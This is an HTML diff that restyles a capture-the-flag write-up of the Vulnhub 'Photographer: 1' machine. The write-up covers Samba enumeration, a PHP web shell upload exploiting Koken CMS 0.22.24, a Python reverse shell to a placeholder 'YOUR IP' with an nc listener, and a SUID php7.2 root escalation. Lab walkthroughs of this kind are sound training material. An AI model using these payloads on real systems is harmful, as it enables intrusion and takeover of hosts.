@@ -137,6 +137,23 @@ code.highlighter-rouge {
 	color: #aa759f;
 	border-radius: 2px
 }
+	
+.gallery{
+}
+
+.gallery img {
+  position: relative;
+  float:center;
+  box-shadow: 0 4px 8px 0 rgba(99, 173, 118, 0.2), 0 6px 20px 0 rgba(99, 173, 118, 0.9);
+  left: 50%;
+}
+
+.desc {
+  padding: 15px;
+  font-size: 20px;
+  color:green;
+  text-align: center;
+}
   </style>
 	</HEAD>
 	<BODY>	
@@ -155,13 +172,13 @@ code.highlighter-rouge {
 		  <h1>Photographer: 1, Vulnhub Writeup</h1>
 		  <p>Posted by Alienum</p>
 		</header> 
-		<div class="tools">
+		<div class="gallery">
 		  <p>
-		   <h2>Port Scan</h2><br>
+		   <div class="desc">Port Scan</div><br>
 		    <img src="source/1.PNG" style="width:500px; height: 500px;"> 
 		   </p>
 		   <p>
-		    <h2>Samba</h2><br>
+		    <div class="desc">Samba</div><br>
 			<code>smbclient -L $IP<br>
 				  smbclient //$IP/sambashare<br>
 				  get mailsent.txt<br>
@@ -171,7 +188,7 @@ code.highlighter-rouge {
 		    <img src="source/2.PNG" style="width:520px; height: 350px;"> 
 		   </p>
 		  <p>
-		    <h2>Read the mailsent.txt</h2><br>
+		    <div class="desc">Read the mailsent.txt</div><br>
 			<code>
 			username : daisa<br>
 			password : babygirl<br>	  
@@ -179,7 +196,7 @@ code.highlighter-rouge {
 		    <img src="source/3.PNG" style="width:600px; height: 360px;"> 
 		   </p>
 		    <p>
-		    <h2>Directory scan</h2><br>
+		    <div class="desc">Directory scan</div><br>
 			<code>
 			dirb http://$TARGET:8000 -f<br>
 			</code>
@@ -190,7 +207,7 @@ code.highlighter-rouge {
 		    <img src="source/51.PNG" style="width:600px; height: 100px;"><br>
 		   </p>
 		 <p>
-		    <h2>Login </h2><br>
+		    <<div class="desc">>Login </div><br>
 			<code>
 			 email : daisa@photographer.com<br>
 			 password : babygirl<br>
@@ -198,40 +215,40 @@ code.highlighter-rouge {
 		    <img src="source/6.PNG" style="width:520px; height: 320px;"><br>
 		  </p>
 		  <p>
-		    <h2>Koken 0.22.24</h2><br>
+		    <div class="desc">>Koken 0.22.24</div><br>
 			<h1>Search for Koken 0.22.24 vulnerability</h1>
 		    <img src="source/7.PNG" style="width:450px; height: 320px;"><br> 
-		    <h1>Found : Koken CMS 0.22.24 Shell Upload</h1><br>
+		    <div class="desc">Found : Koken CMS 0.22.24 Shell Upload</div><br>
 		    <img src="source/8.PNG" style="width:600px; height: 500px;"><br>
-		    <h1>Create malicious jpg file</h1><br>
+		    <div class="desc">Create malicious jpg file</div><br>
 			<code>
 			  system($_GET['cmd']);<br>
 			</code>
 		    <img src="source/9.PNG" style="width:400px; height: 200px;"><br>
-		    <h1>Upload the image.php.jpg</h1><br>
+		    <div class="desc">Upload the image.php.jpg</div><br>
 		    <img src="source/10.PNG" style="width:600px; height: 450px;"><br>
-			<h1>Use Burpsuite to change the image.php.jpg => image.php</h1><br>
+			<div class="desc">Use Burpsuite to change the image.php.jpg => image.php</div><br>
 		    <img src="source/11.PNG" style="width:600px; height: 600px;">
 			<br>
-			<h1>Move the cursor on the "Download File" to see the original path of the image.php</h1><br>
+			<div class="desc">Move the cursor on the "Download File" to see the original path of the image.php</div><br>
 		    <img src="source/12.PNG" style="width:600px; height: 450px;">
 			<br>
 			</p>
 			<p>
-		    <h2>Reverse shell</h2><br>
+		   <div class="desc">Reverse shell</div><br>
 			<h1>We are able to execute commands.</h1>
 		    <img src="source/13.PNG" style="width:800px; height: 320px;"><br> 
-		    <h1>Python reverse shell</h1><br>
+		    <div class="desc">Python reverse shell</div><br>
 			<code>
-			<h1>|Target machine|</h1> <br>
+			<div class="desc">|Target machine|</div> <br>
 			  image.php?cmd= python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>
 			  s.connect(("YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);<br> 
 			  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
-			<h1>|Your machine|</h1><br>
+			<div class="desc">|Your machine|</div><br>
 			 nc -lvp 4444  
 			</code><br>
 		    <img src="source/14.PNG" style="width:800px; height: 400px;"><br>
-		    <h1>Found the user.txt</h1><br>
+		    <div class="desc">Found the user.txt</div><br>
 			<code>
 			  cd /home/daisa/<br>
 			  cat user.txt<br>
@@ -239,15 +256,15 @@ code.highlighter-rouge {
 		    <img src="source/15.PNG" style="width:600px; height: 300px;"><br>
 			</p>
 			<p>
-		    <h2>Root Privilege Escalation</h2><br>
+		    <div class="desc">Root Privilege Escalation</div><br>
 			<code>
 			find / -perm -u=s -type f 2>/dev/null<br>
 			</code>
-			<h2>I found the suspicious /usr/bin/php7.2</h2><br>
+			<div class="desc">I found the suspicious /usr/bin/php7.2</div><br>
 		    <img src="source/16.PNG" style="width:400px; height: 360px;"> <br>
-			<h2>Let's search for GTFOBins php</h2><br>
+			<div class="desc">Let's search for GTFOBins php</div><br>
 			<img src="source/161.PNG" style="width:600px; height: 300px;"> <br>
-			<h2>We found the SUID exploit, i will use the full path for php7.2</h2><br>
+			<div class="desc">We found the SUID exploit, i will use the full path for php7.2</div><br>
 			<code>
 			 CMD="/bin/sh"<br>
             /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"<br>
